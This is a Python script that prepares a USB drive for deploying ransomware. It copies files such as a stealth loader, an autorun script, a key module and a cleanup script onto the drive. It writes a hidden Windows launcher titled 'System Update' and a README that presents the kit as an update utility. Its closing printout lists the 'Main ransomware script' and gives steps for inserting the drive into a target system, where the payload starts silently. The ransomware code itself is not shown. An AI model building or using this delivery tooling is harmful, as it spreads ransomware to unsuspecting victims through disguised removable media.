#!/usr/bin/env python3
"""
USB Setup Script
Prepares USB drive with all necessary files for deployment.
"""
import os
import sys
import shutil
import subprocess
from pathlib import Path

class USBSetup:
    def __init__(self):
        self.usb_path = self.get_usb_path()
        self.source_dir = os.getcwd()
        
    def get_usb_path(self):
        """Get USB drive path from user input."""
        print("Available USB drives:")
        
        # List mounted drives
        possible_paths = ['/media', '/mnt', '/run/media']
        mounted_drives = []
        
        for base_path in possible_paths:
            if os.path.exists(base_path):
                for item in os.listdir(base_path):
                    full_path = os.path.join(base_path, item)
                    if os.path.ismount(full_path):
                        mounted_drives.append(full_path)
                        print(f"  - {full_path}")
        
        # Also check for specific USB mount points
        specific_paths = ['/media/bella/USB', '/media/bella/usb','/media/bella/new','/media/bella/NEW', '/media/USB']
        for path in specific_paths:
            if os.path.exists(path) and os.path.ismount(path):
                if path not in mounted_drives:
                    mounted_drives.append(path)
                    print(f"  - {path}")
        
        if not mounted_drives:
            print("No USB drives found. Please insert a USB drive and run again.")
            return None
        
        # Get user selection
        while True:
            usb_path = input("\nEnter USB drive path: ").strip()
            if os.path.exists(usb_path) and os.path.ismount(usb_path):
                return usb_path
            else:
                print("Invalid path. Please try again.")
    
    def copy_files(self):
        """Copy all necessary files to USB."""
        print("Copying files to USB...")
        
        # Files to copy
        files_to_copy = [
            'main.py',
            'stealth_loader.py',
            'usb_autorun.py',
            'autorun.inf',
            'key.py',
            'core/',
            'cleanup_ransomware.py'
        ]
        
        for item in files_to_copy:
            src = os.path.join(self.source_dir, item)
            dst = os.path.join(self.usb_path, item)
            
            if os.path.exists(src):
                if os.path.isdir(src):
                    if os.path.exists(dst):
                        shutil.rmtree(dst)
                    shutil.copytree(src, dst)
                    print(f"  ✓ Copied directory: {item}")
                else:
                    shutil.copy2(src, dst)
                    print(f"  ✓ Copied file: {item}")
            else:
                print(f"  ✗ File not found: {item}")
    
    def create_launcher_scripts(self):
        """Create launcher scripts for different platforms."""
        print("Creating launcher scripts...")
        
        # Windows batch file
        windows_launcher = os.path.join(self.usb_path, 'launch.bat')
        with open(windows_launcher, 'w') as f:
            f.write("""@echo off
title System Update
pythonw.exe usb_autorun.py
""")
        
        # Linux shell script
        linux_launcher = os.path.join(self.usb_path, 'launch.sh')
        with open(linux_launcher, 'w') as f:
            f.write("""#!/bin/bash
python3 usb_autorun.py
""")
        
        # Make Linux script executable
        os.chmod(linux_launcher, 0o755)
        
        print("  ✓ Created launcher scripts")
    
    def create_readme(self):
        """Create a README file for the USB."""
        readme_content = """USB Deployment Toolkit

This USB contains a system update utility.

To use:
1. Insert USB into target system
2. If autorun is enabled, it will start automatically
3. If not, run launch.bat (Windows) or launch.sh (Linux)

Note: This is for authorized security testing only.
"""
        
        readme_path = os.path.join(self.usb_path, 'README.txt')
        with open(readme_path, 'w') as f:
            f.write(readme_content)
        
        print("  ✓ Created README file")
    
    def setup(self):
        """Main setup function."""
        if not self.usb_path:
            return False
        
        print(f"Setting up USB at: {self.usb_path}")
        print("=" * 50)
        
        # Copy files
        self.copy_files()
        
        # Create launcher scripts
        self.create_launcher_scripts()
        
        # Create README
        self.create_readme()
        
        print("\n" + "=" * 50)
        print("USB Setup Complete!")
        print("=" * 50)
        print("Files copied to USB:")
        print(f"  - Main ransomware script")
        print(f"  - USB autorun script")
        print(f"  - Core modules")
        print(f"  - Launcher scripts")
        print(f"  - Autorun.inf (Windows)")
        print(f"  - Cleanup script")
        print("\nDeployment Instructions:")
        print("1. Insert USB into target system")
        print("2. If autorun is enabled, it will start automatically")
        print("3. If not, manually run launch.bat (Windows) or launch.sh (Linux)")
        print("4. The script will install dependencies and start silently")
        print("5. Remove USB after insertion - no further interaction needed")
        
        return True

def main():
    """Main function."""
    setup = USBSetup()
    setup.setup()

if __name__ == "__main__":
    main() 